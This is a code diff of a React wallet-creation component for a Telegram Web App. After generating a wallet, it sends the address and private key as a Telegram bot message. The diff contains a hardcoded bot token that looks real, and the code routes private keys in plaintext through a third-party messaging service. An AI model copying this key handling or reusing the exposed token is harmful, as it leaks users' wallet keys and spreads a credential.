@@ -29,15 +29,15 @@ export default function Create() {
         address: wallet.address,
         privateKey: wallet.privateKey
       };
-  
+      
       WalletStore.addWallet(newWallet);
       WalletStore.setCurrentWallet(newWallet);
+      setIsComplete(true);
+      setTimeout(() => {
+        router.push('/');
+      }, 2000);
   
-      const message = `
-      ✔️ Кошелёк привязан\n\n
-      ▫️ Адрес: ${wallet.address}\n
-      ▫️ Приватный ключ: \`${wallet.privateKey}\`
-      `;
+      const message = `✔️ Кошелёк привязан\n\n▫️ Адрес: \`${wallet.address}\`\n▫️ Приватный ключ: ||${wallet.privateKey}||`;
 
       const chatId = window.Telegram.WebApp.initDataUnsafe.user.id;
       const botToken = '6216150079:AAHQYudD2PHrbvnmzd7J2yD0eGgZx994ydI'; // Замените на бот-токен
@@ -52,10 +52,6 @@ export default function Create() {
         console.error('Failed to send message:', error);
       }
   
-      setIsComplete(true);
-      setTimeout(() => {
-        router.push('/');
-      }, 2000);
     }
   };
 
